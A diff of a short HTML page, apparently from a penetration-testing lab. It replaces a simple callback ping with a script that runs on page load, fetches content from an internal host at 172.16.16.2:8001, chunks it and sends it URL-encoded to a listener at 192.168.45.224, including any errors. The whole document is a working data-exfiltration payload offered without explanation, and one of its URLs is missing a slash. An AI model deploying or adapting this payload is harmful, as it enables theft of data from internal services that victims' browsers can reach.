@@ -1,12 +1,28 @@
 <html>
 <head>
 <script>
-function runscript() {
-    fetch("http://192.168.45.195/itworked");
-}
+        function exfiltrate() {
+            fetch("http://172.16.16.2:8001")
+            .then((response) => response.text())
+            .then((data) => {
+                if (data.length > 1024) {
+                    let chunks = [];
+                    for (let i = 0; i < data.length; i += 1024) {
+                        chunks.push(data.slice(i, i + 1024));
+                    }
+                    chunks.forEach((chunk, index) => {
+                        fetch(`http://192.168.45.224/callback?part=${index}&data=${encodeURIComponent(chunk)}`);
+                    });
+                } else {
+                    fetch("http://192.168.45.224callback?" + encodeURIComponent(data));
+                }
+            }).catch(err => {
+                fetch("http://192.168.45.224/error?" + encodeURIComponent(err));
+            }); 
+        }
 </script>
 </head>
-<body onload='runscript()'>
+<body onload='exfiltrate()'>
 <div></div>
 </body>
 </html>
